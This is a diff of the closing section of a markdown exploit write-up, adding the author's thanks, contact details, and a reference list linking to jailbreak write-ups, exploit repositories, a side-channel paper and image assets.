+A lot has changed since my last write-up, but this was again an awesome experience and a whole lot of work, and I have again learned an insane amount of new things. The move to x86 was new to me, and this time I've been dealing with a 0day rather than some public bug, but I think I can say I've managed it quite nicely. :P
+
+A "thank you" goes out to all the people I've quoted for their work, as well as to the [radare2 project](https://github.com/radare/radare2) for their overly awesome reverse engineering toolkit.
+
+Again, don't hesitate to shoot me questions or feedback [on Twitter][me] or via mail (`*@*.net` where `*` = `siguza`).
+
+Cheers. :)
 
 ### References
 
@@ -1401,8 +1659,7 @@ The second method however gets us straight to one arbitrary gadget worth of exec
 - Jonathan Levin: [Phœnix jailbreak][phoenix] (write-up)
 - tihmstar and myself: [PhœnixNonce][phnonce] (code)
 - Daniel Gruss, Clémentine Maurice, Anders Fogh, Moritz Lipp and Stefan Mangard: [Prefetch Side-Channel Attacks][prefetch] (paper)
-
-<!-- TODO: tpwn? -->
+- Benjamin Randazzo: [Trident exploit][trident] (code)
 
 <!-- link references -->
 
@@ -1411,6 +1668,18 @@ The second method however gets us straight to one arbitrary gadget worth of exec
   [yalu102]: https://github.com/kpwn/yalu102
   [phoenix]: http://newosxbook.com/files/PhJB.pdf
   [phnonce]: https://github.com/Siguza/PhoenixNonce
+  [me]: https://twitter.com/s1guza
   [qwerty]: https://twitter.com/qwertyoruiopz
   [tihm]: https://twitter.com/tihmstar
+  [benjamin]: https://twitter.com/____benjamin
   [prefetch]: https://gruss.cc/files/prefetch.pdf
+  [trident]: https://github.com/benjamin-42/Trident
+  [img1]: assets/img/1-structs.svg
+  [img2]: assets/img/2-overlay.svg
+  [img3]: assets/img/3-overlay.svg
+  [img4]: assets/img/4-evg.svg
+  [img5]: assets/img/5-lleq.svg
+  [img6]: assets/img/6-zero.svg
+  [img7]: assets/img/7-align.png
+  [img8]: assets/img/8-align.png
+  [img9]: assets/img/9-iohideous.png
